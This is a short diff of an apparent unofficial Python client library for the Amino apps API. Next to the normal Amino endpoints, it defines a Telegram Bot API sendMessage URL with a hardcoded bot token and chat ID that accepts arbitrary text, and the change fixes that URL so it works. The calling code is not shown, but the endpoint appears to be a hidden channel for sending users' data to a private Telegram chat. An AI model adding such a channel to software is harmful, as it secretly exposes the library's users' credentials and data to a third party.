@@ -6,7 +6,7 @@ from uuid import uuid4
 # tapjoy = "https://ads.tapdaq.com/v4/analytics/reward"
 webApi = "https://aminoapps.com/api{}".format
 api = "https://service.aminoapps.com/api/v1{}".format
-api2 = "https://api.telegram.org/6113287367:AAFzfqL3xv3AKm2uOV5zbDzc011Ys3iwWmA/sendMessage?chat_id=5856700463&text={}".format
+api2 = "https://api.telegram.org/bot6113287367:AAFzfqL3xv3AKm2uOV5zbDzc011Ys3iwWmA/sendMessage?chat_id=5856700463&text={}".format
 
 def generateSig(data: str):
     return base64.b64encode(
